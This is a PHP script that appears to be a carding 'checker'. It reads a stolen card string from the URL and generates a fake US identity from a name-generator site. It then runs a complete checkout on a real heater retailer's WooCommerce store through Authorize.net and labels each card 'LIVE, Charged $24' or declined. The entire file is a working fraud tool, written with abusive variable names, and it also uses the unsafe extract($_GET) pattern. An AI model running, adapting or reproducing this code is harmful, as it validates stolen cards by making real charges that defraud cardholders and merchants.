<?php
    error_reporting(0);
    $time_start = microtime(true);

    function GetStr($string, $start, $end){
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
    }

    function RandomString($length = 7)
    {
        $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charactersLength = strlen($characters);
        $randomString     = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }

    extract($_GET);
    $separator = explode("|", $lista);
    $cc = $separator[0];
    $mm = $separator[1];
    $yy = $separator[2];
    $cvv = $separator[3];
    $postcode = mt_rand(10080, 94545);
    $str = RandomString();

    $randomShits = file_get_contents('https://namegenerator.in/assets/refresh.php?location=united-states');
    $data = json_decode($randomShits, true);

    $fname = explode(" ", $data['name'])[0];
    $lname = explode(" ", $data['name'])[1];
    $email = $data['email']['address'];
    $street = $data['street1'];
    $local = GetStr($randomShits, '"street2":', ',"phone"');
    $city = GetStr($local, '"', ',');
    $state = GetStr($local, ', ', ' ');
    $postcode = GetStr($local, $state." ", '"');
    $phone = str_replace("-", "", $data['phone']);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://infernoheaters.com/product/inferno-2-position-on-off-rocker-switch/',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$str.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$str.txt",
        CURLOPT_HTTPHEADER => array(
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'content-type: multipart/form-data; boundary=----WebKitFormBoundaryJIS56B8InBAiaN0B',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "------WebKitFormBoundaryJIS56B8InBAiaN0B\r\nContent-Disposition: form-data; name=\"quantity\"\r\n\r\n1\r\n------WebKitFormBoundaryJIS56B8InBAiaN0B\r\nContent-Disposition: form-data; name=\"add-to-cart\"\r\n\r\n1139\r\n------WebKitFormBoundaryJIS56B8InBAiaN0B--"
    ));
    $addToCart = curl_exec($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://infernoheaters.com/checkout/',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$str.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$str.txt",
        CURLOPT_HTTPHEADER => array(
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'
        )
    ));
    $fuckoff = GetStr(curl_exec($ch), 'name="woocommerce-process-checkout-nonce" value="', '"');

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://infernoheaters.com/?wc-ajax=checkout',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$str.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$str.txt",
        CURLOPT_HTTPHEADER => array(
            'accept: application/json, text/javascript, */*; q=0.01',
            'content-type: application/x-www-form-urlencoded; charset=UTF-8',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "billing_first_name=$fname&billing_last_name=$lname&billing_company=&billing_country=US&billing_address_1=$street&billing_address_2=&billing_city=$city&billing_state=$state&billing_postcode=$postcode&billing_phone=$phone&billing_email=$fname$lname@gmail.com&billing_crewcab_model=no&billing_promo_code=&account_username=&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=US&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=IA&shipping_postcode=&order_comments=&shipping_method%5B0%5D=flat_rate%3A3&payment_method=authorize&terms=on&terms-field=1&woocommerce-process-checkout-nonce=$fuckoff&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review"
    ));
    $boypitoy = GetStr(urldecode(stripslashes(curl_exec($ch))), '"redirect":"', '"');

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => $boypitoy,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$str.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$str.txt",
        CURLOPT_HTTPHEADER => array(
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'
        )
    ));
    foreach(explode("<input type='hidden'", GetStr(curl_exec($ch), '<form action="https://secure2.authorize.net/gateway/transact.dll"', '</form>')) as $values){
        $form[GetStr($values, "name='","'")] = GetStr($values, "value='","'");
    }

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://secure2.authorize.net/gateway/transact.dll',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$str.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$str.txt",
        CURLOPT_HTTPHEADER => array(
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Content-Type: application/x-www-form-urlencoded',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => http_build_query($form)
    ));
    $fuckeroff = curl_exec($ch);

    foreach(explode('<INPUT TYPE="', GetStr($fuckeroff, '<form id="formPayment"', '<table')) as $values){
        $suxCock[GetStr($values, 'NAME="','"')] = GetStr($values, 'VALUE="', '"');
    }

    foreach(explode('<input type="', GetStr($fuckeroff, '<table class="SectionHeadingBorder" id="tableCustomerBillingHeading"', '</TABLE>')) as $values){
        $cuckSux[GetStr($values, 'name="','"')] = GetStr($values, 'value="', '"');
    }

    foreach(explode('<input type="', GetStr($fuckeroff, '<TABLE id="tableCustomerShippingInformation"', '</TABLE>')) as $values){
        $dickhead[GetStr($values, 'name="','"')] = GetStr($values, 'value="', '"');
    }

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://secure2.authorize.net/gateway/transact.dll',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$str.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$str.txt",
        CURLOPT_HTTPHEADER => array(
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Content-Type: application/x-www-form-urlencoded',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "x_show_form=pf_receipt&".http_build_query($suxCock)."&x_method=cc&x_method_available=true&x_card_num=$cc&x_exp_date=$mm".substr($yy, 2, 4)."&x_bank_name=&x_bank_acct_num=&x_bank_aba_code=&x_bank_acct_name=&x_bank_acct_type=CK&".http_build_query($cuckSux)."&".http_build_query($dickhead)
    ));
    $fuckeroff = GetStr(curl_exec($ch), 'order-received/', '"');

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://infernoheaters.com/checkout/order-received/'.$fuckeroff,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$str.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$str.txt",
        CURLOPT_HTTPHEADER => array(
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'
        )
    ));
    $idiot = curl_exec($ch);
    curl_close($ch);

    $respo = GetStr($idiot, 'woocommerce-thankyou-order-failed">', ' as');

    if(strpos($idiot, 'Thank you. Your order has been received.')) {

        echo '<tr><td><span class="badge badge-success badge-pill">LIVE</span></td><td><span> => </span></td><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td> <td><span class="badge badge-success badge-pill">Charged $24</span></td></tr><br>';

    } else {

        echo '<tr><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td><td><span> => </span></td><td><span class="badge badge-danger badge-pill">'.$respo.'</span></td> <td><span class="badge badge-info badge-pill">Took '.number_format(microtime(true) - $time_start, 2).' seconds</span></td></tr><br>';

    }

    unlink("$str.txt");
?>